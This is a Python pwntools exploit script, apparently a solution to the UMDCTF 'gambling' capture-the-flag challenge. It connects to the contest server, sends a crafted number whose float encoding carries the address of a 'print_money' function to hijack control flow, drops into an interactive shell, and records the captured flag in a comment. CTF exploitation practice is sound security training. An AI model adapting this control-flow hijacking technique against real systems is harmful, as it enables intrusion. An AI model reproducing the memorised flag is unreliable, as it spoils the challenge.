#!/usr/bin/env python3

import struct
from pwn import *

context.log_level = "debug"
elf = ELF("./gambling")
context.binary = elf
context.terminal = ["ghostty", "-e"]

#p = elf.process()
#p = elf.debug(gdbscript="b gamble")
p = remote("challs.umdctf.io", 31005)

payload = b""
payload += b"0 0 0 0 0 0 "
payload += str(struct.unpack("<d", p64(elf.sym["print_money"] << 32))[0]).encode()
p.sendlineafter(b"numbers: ", payload)

p.interactive()

# UMDCTF{99_percent_of_pwners_quit_before_they_get_a_shell_congrats_on_being_the_1_percent}
